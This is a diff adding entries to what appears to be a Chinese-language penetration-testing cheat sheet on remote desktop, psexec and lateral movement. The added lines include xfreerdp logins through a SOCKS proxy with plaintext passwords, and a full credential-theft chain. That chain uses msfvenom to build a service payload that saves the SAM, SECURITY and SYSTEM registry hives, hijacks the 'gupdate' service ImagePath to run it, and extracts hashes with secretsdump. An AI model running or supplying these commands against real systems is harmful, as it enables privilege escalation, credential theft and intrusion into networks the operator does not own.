@@ -686,6 +686,8 @@ DNS隧道
 # 远程桌面
 ## xfreerdp
 ```bash
+xfreerdp /proxy:socks5://47.92.64.139:1234 /v:172.22.4.45 /u:'WIN19\Adrian' /p:babygirl1
+xfreerdp /u:CONTOSO\JohnDoe /p:Pwd123! /v:1.2.3.4
 xfreerdp /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
 xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
 xfreerdp /v:${your ip} /u:${your user name} /f /monitors:1 +fonts +window-drag +clipboard
@@ -752,6 +754,7 @@ psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执�
 ## impacket/psexec.py
 
 ```sh
+pip install impacket
 # 注意前缀本例是域名 god/
 # 1.命令行
 python psexec.py god/administrator:hongrisec@2019@192.168.52.143
@@ -768,6 +771,18 @@ python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat
 proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 111qqq...
 # 登录测试
 proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15
+
+# 注册表文件 sam security system 导出hash, 见 delegation
+msfvenom -p windows/x64/exec cmd="C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\sam.bat" --platform windows -f exe-service > delegation.exe
+## sam.bat
+reg save HKLM\SYSTEM C:\Users\Adrian\Desktop\system
+reg save HKLM\SAM C:\Users\Adrian\Desktop\sam
+reg save HKLM\SECURITY C:\Users\Adrian\Desktop\security
+## run this
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Adrian\Desktop\delegation.exe" /f
+sc start gupdate
+## get hash
+/home/kali/.local/bin/secretsdump.py LOCAL -sam /tmp/sam -security /tmp/security -system /tmp/system
 ```
 
 ## mstsc
